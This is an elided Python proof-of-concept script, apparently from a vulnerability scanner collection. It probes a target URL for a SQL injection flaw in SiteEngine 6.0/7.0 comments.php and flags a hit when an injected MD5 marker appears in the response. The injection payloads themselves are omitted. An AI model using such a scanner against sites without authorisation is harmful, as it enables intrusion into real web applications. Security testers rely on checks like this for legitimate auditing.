...
class siteengine_comments_module_sqli:
    ...
    def run(self):
        ...
        try:
            ...
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                printGreen("[+]Success:存在SiteEngine6.0 comments.php SQL注入漏洞...(高危)\tpayload: "+vulnurl)
            ...
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                printGreen("[+]Success:存在SiteEngine7.0 comments.php SQL注入漏洞...(高危)\tpayload: "+vulnurl)
            ...
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                ...
                printBlue("[-]Info:不存在siteengine_comments_module_sqli漏洞")
...
if __name__ == "__main__":
    ...
    testVuln = siteengine_comments_module_sqli(sys.argv[1])
    testVuln.run()